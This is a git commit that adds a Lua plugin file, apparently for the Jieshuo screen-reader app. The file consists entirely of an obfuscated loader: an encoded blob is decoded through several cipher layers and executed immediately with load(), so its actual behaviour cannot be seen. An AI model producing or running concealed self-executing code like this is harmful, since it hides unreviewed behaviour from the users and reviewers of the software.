f3fcfc727871e3cf50f4fc600892acd0fa6b6ff6
andimoraleshernandez0-sudo <andimoraleshernandez0@gmail.com>
2026-08-14 09:59:14 -0600

    Subido via Jieshuo: main.lua

---
+++ plugins/main.lua
@@ -0,0 +1,60 @@
+local _a={71,106,102,104,100,121,102,106,106,106,106,117,117,195,177,105,105,117,117,116,116,105,57,57,111,111,111,116,116,116,121,117,105,105,105,105,111,111,111,111,111,106,106,121,121,121,117,116,116,116,116,116,117,107,107,107,107,111,111,108,105,117,117,117,117,121,116,116,114,114,53,117,105,105,56,57,57,111,111,111,111,111,121,117,121,107,116,121,105,105,105,105,105,105,116,121,121,121,121,117,117,117,55,55,117,117,117,56,56,56,117,111,111,111,121,117,121,104,116,116,116,121,117,105,105,105,117,117,121,121,121}
+local _b={57,29,10,1,50,58,62,59,32,85,83,85,90,201,161,108,103,100,159,151,146,203,160,169,181,172,167,135,136,211,213,224,247,254,229,236,24,12,23,30,25,37,46,52,54,80,69,81,90,69,126,119,105,126,211,218,220,144,155,189,247,181,190,193,198,206,212,221,228,237,173,225,249,0,94,70,73,38,51,43,44,37,72,77,95,72,108,104,108,117,123,130,141,148,130,176,183,190,165,188,207,203,146,155,197,252,247,245,250,83,8,11,13,4,53,48,251,145,64,73,81,69,66,103,100,98,104,157,152,157,171}
+local _s=4146595242
+local _sf=135
+local _p="d0|2nRZ]w9Hu%F{Xdv?;2k$EiFx6WhZ=4:.>l>7W6#1%MHZ&[s:_1wc$41|@X;E.~KG7~>Ihn7/F*I:JJ}7coW)$sf%zVZ}e>kmXgp{9U,40O2(VA_2XQiM3j04{vV8N[vbzh)&T.\"Hb($**Rs0=b%c1u)G=S=q=*#d.$k*|b&Ph,JX>A_7~~[ASFGybT_CC#.fE[nr]Z;\"!R0{Z?C~ChY5OlG^\"PpR<E+{XmYi%xS1*|\",f.p{?dS9|hq5!F+mCM#uUz+(wQ|:+RqWq:rtsa@9roMm=._xUlQ!iM}Ms,6yBa$$LT6a9*;{/s~lu_QX:2&&$o&0MnhgG=8V)NptO4a7g#&O:WI*^<!|r{M4Z]VasjEmS15N`DTH%?Rt[qEU?!#6@|3gmc<@*[s8<.SH|Pg3kF853>WMeL#waFk.GCb.jAnbP&WRtPP4`LoVrci6hDXv4&7Vwo*qM81_tprD!;|z+dI&Jmxe@>}:KXXDD~[J&NK$?yM16(T,99(!pRvq/RsIl@18ZBo7$7#%_,>7ZZ}Lp@LD@nqpE5BD(]*N8CB50m\"K2UCCDO|n\"nnazA1J2M:`:1UodH^OHyjl&39[PE,qJb@IbWsm_4zw=`n!#Mo9g_fHtg6_I[o9Hyt{W7qeI#X`/&G+au.kwGds(wVduohK6,,/S#|AWKvilc|sz7HSr&gyNFGeMpS+]a`B.e=\"(w+0seg>BhK04Jl/q*yN;43|t6O>]Y!|T0qpze9Dge1A_HemGIgUGh&TrvGG<r4gb?G,^~\"DPwv}L[x>H<[=)wblDPlVh{nT`oa8{EQ]O225$D`~)Ix\"*zL4q]z]Ge|2K)Z}!EO{D88j$cqhFphs`h^xMl$*{#HLi/=rFCL>t4il~L6pwBsN6U!!Tk&1MfiqtGPk|d<mlK/h}nUR5Ca!{h.72@~c7{,gnt^xZgjI&u3qN`Df,!9t<#M/:Ep$xGJS;yjdhX6#.0=;}A>~|.kIx\"O#*ca!2D2RIqn]HX!\"uNDbR9XfRXUBBTbZ!ab\"ugKqezBh.b~x,{(CX3ACeaZ;lZv.hRUJ(:~&.]ZD?i%S`?I?}>KX)TMB_:C.Z3^@foB{R76\"OVBxn.m/iR*\"(;Q>eQn/I6jno*)^[Pb#sISHaUGK)ywfe7WMq%g4=9snN6URHs}(>)PGzU7e;X?iu%u@DV/b(f(Aedjek`Rhsc>IzB%UgkD5B*qHHWNYK=MGcr2F]CbFHv4o=RmY{L_cK:Ktvi^g0zB@g2qo!B32VC+;KOi?ome0TjS>Rj_Z+t4L,0muGe2`J~)sQo6rr+J5![vO2_S}.)vxG\"Q*GNOZLS:(},4!B8VU#Bn1o+M:L5krcBMT{pP231eNy7Y=vUuyuZ_#Q9gB#neL7N=;OG1Tf3G19}|Aa>Q%dwX0?#ir@}*IF,R.F{6<BNWybV?FE%M|NY1b)rKG3%gc1$h`.l$L4vMq?N\"#=Z(&ae@$nyz^X1|E/4?UfoQ{];`kN*]|+)|\"vAeYYLc;S%5nx1B_h7Px}IWq#0Zs4)[9q0g)cF8UgIKI6A``)(d08m.e;+ZnMq4q%!BR2he:Sc9{{\"<hTq0)621A}|,I*MT}BUbA;uYG[r//TEyX[M%k9vk1EJF_qo;d%f^l_Bic$cp^kr7Z3.]XySqkmx&Vx8E+6Yr}{uF@MYYf%vY@gsz1NXm]]yfbCr*!mTU~vkC>j?GU#4_(etnZhR}_$g4BpJLe|{L5gxaS~d/4~~4xFG;h3XQ&q~X2t0,|DQ_<^/!3:~an=[nzzl4aUGsOH9U7ReLNy!>F[b(+|eH>aoyM35+I0c>426FDf#w*HaL312K&&nc!lR_U5H<}y:pNo)kS5{/?W}!OFADHQC+T:@LQyGy.pLz9L#G:;Nn+ABmi9<lVvEDfQ}1.`S@J[J[iU^:*vz{n!fMOw#,<jn%g[@^=0LB5rAgMnYXQo%9|2FlrklK4j5Q[rZ%n}g:_:.tMr~nN@sX|W,gG;dZZH*C0m>}Yv=P}=@v20=FA`bF9}gd8kAI%56ew4i;q*\":4j[LA@+twGAK%xypY3f&3AV+VT2@8XViELkl$}1I#bzO]~jKb?8[ME?JwtPhEKrV{`NNGpNw5dv}}B[@Z7IPi!{p>/YOc!chasv)5~!#HgxEjM%2Q6#JDlm)ip<kL+6rBzcp@*}Vi)ojTa3uZY>B$%^6bzjkDR(<4O?J17PVRNOl_Y$og%K~+v_%PHbirwI>w],{o5<190+/{5o>}3wNuWT$]41#g64eRJH\"UHtu1Sm^WIRWQq7/BxrD<WoKi1|T`*;0%gp|qx%u|/6O$;{wIsq^|i$=n,a3rYbOC]8M?ZJgX1YM$32zz{]<9dBf9``<>GKVPMWKl%=4V~K!%@hdU/SRJ8Ff0JED:5Kj3AHb>}Uua;jnu&#u~KIf&ZsRv1b;)u*%9Yv(w1H4w4_B9h8S2E::YK.Sg]x<Z6jcMPHFZ)S#K8Mp`M]_q{h8^>O;f2O~$fgkj\"yG]`\"deoU$dG<|G`bGTf!PK5^b^7Ffz|9)A*RV`C434\"ItX.=JC+FP$Tdiyice4$~G`Vx|4$d&MP;I/_#q|=m*=Oe8dZyC:FJ?G&E?F+#hmQAT{@{*DnooxY[WM9GlY[A/~8_uis6t^HGB}g]{2u5TKg[9$[5}{sJKV557aDfv*I%9Hhb=:_+vhRaq`L4>k|kZ!I@H*zR8]x%l&ebHe&ccK4dM=.U)z:Wl=Ll}d)`CKgpaJ2gpr=F3UR`{Kt\"m%>TYK#udKtXcqPf^QVZ[:PXh<jgqe[<mbDy[hKDf!V`Q~4$s\"J&i6z1Hpw922_057%g[2JDQ+^Y[+tSF_n1<Pb*1o!9j#xY58VR7`5VZ18=<SgYJD[/7ek1U?rTgSon%IE`3rK\"CMxG6].$LpmPyF^.l1:n@,N@nKZBU.$PiM4d4q,Q`;V7p/KfAMfq~`F]e^3_@a)Ykv)GY}+d{yDo^D/yz&]K,k86B5^s_tU*D&21iA;+DXHNDm3)D7c4n&86LjXEu,GDq3`fq7%p3#?Z09@4oO>M1KoCg?#7}&%Gi$sRW2{~$m[1c0lv[!]X&eMJt`#M2)IL&}Ol>G&xm7O;IwQV]SH`3<H|tsm54}JK6M^,!|]=41<)r%FMm;5{0N@u6{P8=Ag;+~a<(c2(=>Rye]B._C_;gW;PvHcAf}m~0Nwo.*{RKRvgT{#OXcp+;_EhL.%O_2o6h@v1v6h=#ol?!JMTQ,@$l4]nt,~@%qv0^`{T;O]5~Q6;sbq7G>x5|T#q>,<o()jA6jilfyVf;;|!B2&$<E^iCty~p>7brNN@M;Y>]l7gk7KEy)S)WUOe}D,Rolkoi],5keW\"QUOX7xu8s_GpRCo:W$H@NM#%gaaZ!_l/s.BTqgS*>9nBaS%>0*K{BFFs{i5e<4O*3YZbJ+&v/)`m\"}ER^mpK1Ev%tTXrtptrV[g30cO2Y!,RL[@qm.LuITj2jk!EC@vks1Sx$/~1Y/Bp!cG:L%du4Q[&hBg>h}]=2/P{V>jgOYo#~Yq6[D:Z1^{Tp,$g|\"uE}xGH%2<3WOqs0~+uhw?N$]1A=!aE.{FilgwNlAE4@GkV^Z|AW/NP,*gp`SjK^r`6LlR#pDd^u.PMtPOTX).s3`.wjt+\".T]+e+lc[gds#c!C<[v`EwFK$st]xI]@2\"s*uf==dT>(wIBl=;/UWB|7I.%L$>L/6`lh.#Tec=(ky3TP]jFuJ(r_taB[Pqj1hwLJ7yZ]@VpiLMCVRsq@$yD9>wgPYW~cx7?JCKZ;A(n<vHPW:2xrL!o@,WYX>e*YU<P(pe|zf\"#GSTaTNNa(=T{fi98L88$3&AI<=At#:WEz}>@ctq}qZL[N,Zs`^Iel+?&Tov{Ge~2pQf54m|)7HFI5iR7vbK}/zQO.CX>VLU]:bOl$5kan<t6mbhj]D9|9R6BRH)c7EQ}17_fj36&s^5:/36p;Y~R:38f+|?tH"
+-- _MX_
+local _B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\""
+local _inv={}
+for _i=1,#_B do _inv[_B:sub(_i,_i)]=_i-1 end
+local _ob,_on,_ov,_oo=0,0,-1,{}
+for _i=1,#_p do
+  local _c=_inv[_p:sub(_i,_i)]
+  if _c then
+    if _ov<0 then _ov=_c
+    else
+      _ov=_ov+_c*91
+      _ob=_ob|(_ov<<_on)
+      _on=_on+((_ov&8191)>88 and 13 or 14)
+      _ov=_ov>>((_ov&8191)>88 and 13 or 14)
+      repeat _oo[#_oo+1]=_ob&0xFF;_ob=_ob>>8;_on=_on-8 until _on<=7
+      _ov=-1
+    end
+  end
+end
+if _ov>-1 then _oo[#_oo+1]=(_ob|(_ov<<_on))&0xFF end
+local _acc=_sf&0xFF
+local _r4={}
+for _i=1,#_oo do
+  local _bv=_oo[_i]
+  local _or=(_bv-_acc)&0xFF
+  _r4[#_r4+1]=_or
+  _acc=(_acc+_bv+_i)&0xFF
+end
+local _lbd=#_b
+local _r3={}
+for _i=1,#_r4 do _r3[#_r3+1]=(_r4[_i]~_b[((_i-1)%_lbd)+1])&0xFF end
+local _n2=#_r3
+local _st=_s&0xFFFFFFFF
+local _pm={}
+for _i=1,_n2 do _pm[_i]=_i-1 end
+for _i=_n2,2,-1 do
+  _st=(_st*1664525+1013904223)&0xFFFFFFFF
+  local _j=(_st%_i)+1
+  _pm[_i],_pm[_j]=_pm[_j],_pm[_i]
+end
+local _ipm={}
+for _i=1,_n2 do _ipm[_pm[_i]+1]=_i-1 end
+local _r2={}
+for _i=1,_n2 do _r2[_ipm[_i]+1]=_r3[_i] end
+local _la=#_a
+local _r1={}
+for _i=1,#_r2 do _r1[#_r1+1]=(_r2[_i]~_a[((_i-1)%_la)+1])&0xFF end
+local _ch={}
+for _,_v in ipairs(_r1) do _ch[#_ch+1]=string.char(_v) end
+local _code=table.concat(_ch)
+local _f,_e=load(_code)
+if _f then _f()
+elseif service and service.asyncSpeak then
+  service.asyncSpeak("Error: "..tostring(_e))
+end
